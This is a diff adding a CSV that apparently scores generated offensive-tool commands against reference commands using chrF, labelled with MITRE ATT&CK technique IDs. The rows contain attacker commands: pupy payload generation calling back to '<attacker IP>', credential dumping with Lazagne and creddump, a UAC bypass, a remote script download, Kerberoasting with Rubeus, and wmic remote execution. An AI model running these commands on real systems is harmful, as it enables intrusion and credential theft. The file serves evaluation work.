@@ -1,0 +1,24 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_adfind_TA0007_T1083.txt,adfind,adfind -sc exchaddresses:smtp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,24.007,True
+command_adfind_TA0007_T1083.txt,adfind,adfind -sc indexedl msDS-ReplValueMetaData,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,18.493,True
+command_adfind_TA0007_T1083.txt,adfind,"adfind -sc sdump | findstr /s ""confidential"" || findstr /s ""secret""",`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,15.638,True
+command_adfind_TA0007_T1083.txt,adfind,adfind -sc adobjcnt:user,"adfind -f ""(objectcategory=group)""`",30.039,True
+command_adfind_TA0007_T1083.txt,adfind,adfind -sc adobjcnt:group -pr msDS-ReplConnectionFailures,"adfind -f ""(objectcategory=group)""`",21.331,True
+command_pupy_TA0001_T1078.txt,pupy,sudo_alias -c 'whoami' && bypassuac -h 192.168.1.100 -p 3389 && getsystem,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,10.42,True
+command_pupy_TA0001_T1078.txt,pupy,Beroot -t windows,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,24.553,True
+command_pupy_TA0001_T1078.txt,pupy,privesc_checker -l 192.168.1.100 -p 3389,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,11.805,True
+command_pupy_TA0001_T1078.txt,pupy,Lazagne -r C:\Users\adm_admin\AppData\Roaming\Microsoft\Credentials,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",38.868,True
+command_pupy_TA0001_T1078.txt,pupy,creddump -o C:\Users\adm_admin\AppData\Roaming\Microsoft\Credentials,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",38.887,True
+command_pupy_TA0001_T1078.txt,pupy,hashmon -p /dev/mem,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",11.304,True
+command_pupy_TA0002_T1059.txt,pupy,"pyexec -c 'import os; os.system(""tasklist /V"")'",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,10.594,True
+command_pupy_TA0002_T1059.txt,pupy,run --bg socks5proxy,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,9.586,True
+command_pupy_TA0002_T1059.txt,pupy,"pyexec -c 'import requests; r = requests.get(""https://example.com/script.py""); open(""script.py"", ""wb"").write(r.content)'",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,9.235,True
+command_pupy_TA0002_T1059.txt,pupy,beroot --target <windows|linux>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,24.025,True
+command_pupy_TA0002_T1059.txt,pupy,privesc_checker --system <windows|linux>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,23.131,True
+command_pupy_TA0002_T1059.txt,pupy,"pyexec -c 'import os; os.system(""powershell -nop -w hidden -c \""Add-Content -Path $env:USERPROFILE\Desktop\script.ps1 -Value @()\"""")'",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,11.706,True
+command_pupy_TA0002_T1059.txt,pupy,run --bg portfwd 3389 localhost 3389,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,12.993,True
+command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe purge /luid:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,26.619,True
+command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe triage /luid:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,26.927,True
+command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe deletefile /path:<placeholder> /filename:MGsCOxPSNK.txt,`rubeus.exe kerberoast /domain:oz.local`,17.381,True
+command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe deletefile /path:<placeholder> /filename:<dll_name>.dll,`rubeus.exe kerberoast /domain:oz.local`,17.093,True
+command_wmic_TA0007_T1082.txt,wmic,wmic computersystem get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`",24.39,True
